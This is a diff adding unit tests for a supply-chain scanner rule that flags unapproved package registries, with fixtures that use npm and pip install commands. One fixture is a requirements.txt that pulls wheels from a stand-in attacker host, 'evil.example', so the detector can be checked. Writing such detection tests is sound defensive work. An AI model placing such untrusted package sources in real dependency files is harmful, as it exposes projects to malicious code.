@@ -1,10 +1,16 @@
 """SR-008: Supply chain risk rule unit tests."""
 
 import json
+from datetime import date
 
 import pytest
 
 from scanners.risk_scanner.rules import supply_chain
+from scanners.risk_scanner.registry_policy import (
+    RegistryClassification,
+    RegistryEntry,
+    RegistryPolicy,
+)
 from tests.scanner_mock import MockScanner
 
 
@@ -196,6 +202,83 @@ class TestSR008SupplyChain:
         assert not any(
             "非官方依赖源" in finding["title"] for finding in s.findings
         )
+
+    def test_short_find_links_and_bare_url_are_one_policy_advisory(self):
+        s = MockScanner(files={})
+        s._file_contents = {
+            "requirements.txt": (
+                "-f https://evil.example/wheels\n"
+                "https://evil.example/demo-1.0-py3-none-any.whl\n"
+            )
+        }
+
+        supply_chain.run(s)
+
+        advisories = [
+            item for item in s.review_advisories
+            if item["code"] == "dependency_registry_policy"
+        ]
+        assert len(advisories) == 1
+        assert "2 条" in advisories[0]["description"]
+        assert "evil.example (2)" in advisories[0]["evidence"]
+        assert "unknown_host (2)" in advisories[0]["evidence"]
+        assert s.findings == []
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "npm install -f --registry https://mirror.internal/ demo\n",
+            "npm install -f \\\n  --registry https://mirror.internal/ demo\n",
+        ],
+    )
+    def test_npm_force_keeps_registry_api_approval(self, command):
+        s = MockScanner(files={"setup.sh": command})
+        s.registry_policy = RegistryPolicy([
+            RegistryEntry(
+                ecosystem="npm",
+                exact_host="mirror.internal",
+                classification=RegistryClassification.APPROVED_PRIVATE,
+                evidence_url="https://security.internal/npm",
+                allow_as_resolved_download=False,
+                note="Approved for npm registry API use only.",
+                reviewed_at=date(2026, 9, 23),
+            )
+        ])
+
+        supply_chain.run(s)
+
+        assert s.review_advisories == []
+
+    @pytest.mark.parametrize("option", ["-f", "--find-links"])
+    def test_pip_find_links_continuation_requires_download_approval(
+        self, option
+    ):
+        s = MockScanner(files={
+            "setup.sh": (
+                f"pip install {option} \\\n"
+                "  https://registry.example/wheels demo\n"
+            )
+        })
+        s.registry_policy = RegistryPolicy([
+            RegistryEntry(
+                ecosystem="pypi",
+                exact_host="registry.example",
+                classification=RegistryClassification.APPROVED_PRIVATE,
+                evidence_url="https://security.example/pypi",
+                allow_as_resolved_download=False,
+                note="Approved for registry API use only.",
+                reviewed_at=date(2026, 9, 23),
+            )
+        ])
+
+        supply_chain.run(s)
+
+        advisories = [
+            item for item in s.review_advisories
+            if item["code"] == "dependency_registry_policy"
+        ]
+        assert len(advisories) == 1
+        assert "usage_not_allowed (1)" in advisories[0]["evidence"]
 
     def test_registry_advisory_lists_only_five_hosts_plus_count(self):
         packages = {
